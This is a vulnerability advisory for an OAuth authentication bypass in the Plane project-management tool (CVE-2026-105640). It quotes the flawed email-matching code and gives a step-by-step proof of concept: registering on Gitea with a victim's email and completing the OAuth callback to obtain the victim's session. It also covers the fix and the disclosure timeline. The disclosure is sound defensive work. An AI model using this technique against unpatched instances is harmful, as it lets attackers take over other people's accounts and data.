# CVE-2026-105640: Plane logs you into any account whose email your OAuth provider claims

**Published:** 2026-10-05 **Reported:** 2026-05-23 **Severity:** 9.1 Critical **Status:** Fixed in Plane 1.4.0 (GHSA-7j95-vh8g-f365) **CWEs:** CWE-290 (Authentication Bypass by Spoofing) + CWE-287 (Improper Authentication)

---

Plane's OAuth login takes the email string from the provider's userinfo response and looks up a local account with `User.objects.filter(email=email).first()`. If a row comes back, that user is logged in. Nothing on the path checks whether the provider said the email was verified, and nothing checks whether the matched account was ever associated with OAuth at all. On an instance configured with Gitea, where a self-registered account can carry any email you type, an attacker who knows a victim's email address logs into that victim's Plane account. The victim's password is never involved. Assigned CVE-2026-105640, rated Critical at 9.1, fixed in Plane 1.4.0.

---

## Where the trust goes missing

`apps/api/plane/authentication/adapter/base.py`, in `complete_login_or_signup`, as it stood on v1.3.1:

```python
def complete_login_or_signup(self):
    email = self.user_data.get("email")
    email = self.sanitize_email(email)          # format validation only
    user = User.objects.filter(email=email).first()
    is_signup = bool(user)
    if not user:
        ...                                     # new-user branch
    ...
    user = self.save_user_data(user=user)       # logs the matched account in
```

`sanitize_email` validates the shape of the string, not its provenance. The lookup matches on the string and nothing else. There is no `email_verified` claim consulted anywhere on this path, and no check that the row it found was created through OAuth rather than through password signup. A password account and an OAuth account are logged in identically.

This is the whole bug, and it sits one layer below any individual provider. Whether it is reachable depends on whether the configured provider will hand Plane an email the attacker chose.

The Gitea provider will. `apps/api/plane/authentication/provider/oauth/gitea.py`:

```python
def set_user_data(self):
    user_info_response = self.get_user_response()
    ...
    email = user_info_response.get("email")     # profile email, taken first
    if not email:
        email = self.__get_email(headers=headers)
    super().set_user_data({"email": email, ...})
```

There is a `__get_email` helper that walks `/api/v1/user/emails` and prefers the primary, verified address. It is the fallback. The profile email from `GET /api/v1/user` is taken first, and on any normal account that field is populated, so the verified path never runs.

Across the four providers Plane ships:

| Provider | Email source | Verified check | Affected |
|---|---|---|---|
| Gitea | profile email, taken first | none on that field | yes, on default Gitea config |
| GitLab | `/api/v4/user` email | none | self-managed with confirmation off; gitlab.com verifies |
| GitHub | primary email | none in code, but github.com enforces primary equals verified | no on github.com |
| Google | userinfo email | none in code, Google verifies | no on Google |

GitHub and Google are safe by accident rather than by design. Plane does not check the flag for them either; those providers simply never emit an unverified address. That distinction matters, because it means the safety of a Plane instance depends on a property of the identity provider that Plane never verifies and the operator may not know they are relying on.

## Gitea hands out whatever email you type

The Plane half only matters if the provider half is real, so I checked it against a stock Gitea 1.21 with its default posture: `REGISTER_EMAIL_CONFIRM=false`, mailer disabled, registration open. No admin access, no configuration changes.

```console
POST /user/sign_up          (public form, no admin)
user_name=attacker2 & email=victim2@corp.test & password=... & retype=...

HTTP/1.1 303 See Other
```

The account is active immediately. Then the exact endpoint Plane reads:

```console
GET /api/v1/user
Authorization: Basic attacker2:...

HTTP/1.1 200 OK
{"id":1,"login":"attacker2","email":"victim2@corp.test","active":true, ...}
```

Gitea returns the address the attacker typed into a signup form, with no verification of any kind, through the field Plane consumes first. Self-hosted Gitea with mail disabled is an ordinary way to run Gitea, which is what makes this the default-configuration case rather than a hardening edge case.

## PoC

Victim `bob@plane.test` is a password account created independently in Plane, id `36e49693-873d-4408-9640-fb75722dbbba`. The attacker holds no Plane account and does not know Bob's password. The attacker controls one Gitea identity whose email field is Bob's address.

**Step 1.** The attacker starts Gitea OAuth on Plane:

```console
GET /auth/gitea/

HTTP/1.1 302 Found
Location: http://<gitea-host>/login/oauth/authorize?client_id=...&scope=openid+email+profile
          &redirect_uri=http%3A%2F%2Flocalhost%3A18080%2Fauth%2Fgitea%2Fcallback%2F
          &response_type=code&state=c4a3350b9d8443a59aa42052e50cbaa4
```

**Step 2.** The attacker returns to the callback with that state. Plane does the server-to-server token exchange, reads `GET /api/v1/user`, receives `bob@plane.test`, and matches the existing local row:

```console
GET /auth/gitea/callback/?code=anyauthcode&state=c4a3350b9d8443a59aa42052e50cbaa4
Cookie: <attacker session>

HTTP/1.1 302 Found
Set-Cookie: session-id=<issued by Plane>
```

**Step 3.** Whose session is it:

```console
GET /api/users/me/
Cookie: session-id=<from step 2>

HTTP/1.1 200 OK
{"id":"36e49693-873d-4408-9640-fb75722dbbba","display_name":"bob","email":"bob@plane.test",
 "is_email_verified":true,"is_password_autoset":false,"last_login_medium":"gitea"}
```

Two fields in that response carry the finding. `is_password_autoset:false` means Bob is a pre-existing password account, not one Plane created during an OAuth signup. `last_login_medium:gitea` means the session was minted through the OAuth path. Taken together: an account that has its own password was just handed to someone who never supplied it.

## Impact

On a Plane instance configured with Gitea OAuth, or self-managed GitLab OAuth without email confirmation, anyone who can register with the provider takes over any Plane account whose email address they know. Email addresses are routinely known, published in commits, or trivially enumerable. The attacker lands in the victim's session with full access to their workspaces, projects and data. Aim it at a workspace owner or admin and the workspace goes with it.

Note also what is not required: no Plane account, no privilege inside Plane, no interaction from the victim, no race, and no position on the network. The provider account is not a Plane privilege.

**CVSS 3.1:** 9.1 Critical, `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`.

`AC:L` is the metric most worth defending, since the obvious objection is that the affected provider is a precondition. It is, and it is stated as the affected configuration rather than folded into attack complexity. Within that configuration the attack has no race, no man in the middle, and no target preparation beyond what the attacker already controls. On a default Gitea the attacker self-registers with the victim's address and the first attempt succeeds. `A:N` because losing the victim's data is a downstream consequence of the integrity impact, not a separate primary one.

Affected: Plane `<= 1.3.1`, confirmed on v1.2.3, same code on v1.3.1 and `preview` HEAD `039d582`.

## Fix

The report suggested fixing both layers: carry the provider's verification signal into `user_data` and reject logins without it, and separately refuse to log into a pre-existing local account through OAuth unless that account was created through OAuth or the provider asserted a matching verified email.

Plane 1.4.0 fixed it at the provider, which closes the reachable path:

```python
def set_user_data(self):
    user_info_response = self.get_user_response()
    ...
    # Always use __get_email() which enforces the verified-email requirement.
    # The user object's .email field carries no verification flag, so it cannot
    # be trusted directly (GHSA-7j95-vh8g-f365).
    email = self.__get_email(headers=headers)
```

The unverified profile field is gone and the primary-and-verified helper is now the only source. An attacker's self-registered Gitea account no longer produces a usable email for Plane, so the match in `complete_login_or_signup` never happens.

That is the right call for shipping a fix fast, and it is worth being precise about what it does and does not cover. The email-match behaviour in `base.py` is unchanged: Plane will still log a caller into a pre-existing password account on an email string match, and it still has no `email_verified` gate of its own. The defence now rests on every provider implementation doing its own verification correctly. The three existing providers do, after this change. A fifth provider added later would have to remember, and nothing in the shared code path will catch it if it does not.

Fixed in Plane 1.4.0, released 2026-07-31.

## Disclosure

| Date         | Event                                                      |
|--------------|-------------------------------------------------------------|
| 2026-05-23   | OAuth surface reviewed, exploited end to end on CE v1.2.3, reachability confirmed against a stock Gitea 1.21 |
| 2026-05-23   | Reported via GitHub Security Advisory                       |
| 2026-07-31   | Fix ships in Plane 1.4.0                                    |
| 2026-08-03   | GHSA-7j95-vh8g-f365 published, CVE-2026-105640 assigned     |

## Takeaways

"Log the user in if the email matches" is a reasonable-looking line of code, and it is reasonable exactly when the email is proof of control of the mailbox. OAuth userinfo is not that proof unless the provider says it is, which is what the `email_verified` claim is for and why OIDC specifies it.

What makes this class easy to ship is that it tests clean against every provider a developer is likely to try. github.com and Google will not give you an unverified address, so a developer building and testing against them will never see the failure, and the missing check leaves no trace in the working flow. The bug only appears once an operator points the same code at a provider with different guarantees, which is a configuration decision made long after the code was written, by someone who has no reason to know the check was skipped.

So the question to ask of any email-matching login path is not "does this work" but "what is the weakest provider this can be pointed at, and does the code survive it". Here the weakest provider is any self-hosted Gitea with mail turned off, which is a normal way to run Gitea.

## Links

- Advisory: https://github.com/makeplane/plane/security/advisories/GHSA-7j95-vh8g-f365
- CVE record: https://www.cve.org/CVERecord?id=CVE-2026-105640
- Plane: https://github.com/makeplane/plane
- RFC on `email_verified` (OIDC Core, section 5.1): https://openid.net/specs/openid-connect-core-1_0.html#StandardClaims
- CWE-290: https://cwe.mitre.org/data/definitions/290.html
- CWE-287: https://cwe.mitre.org/data/definitions/287.html
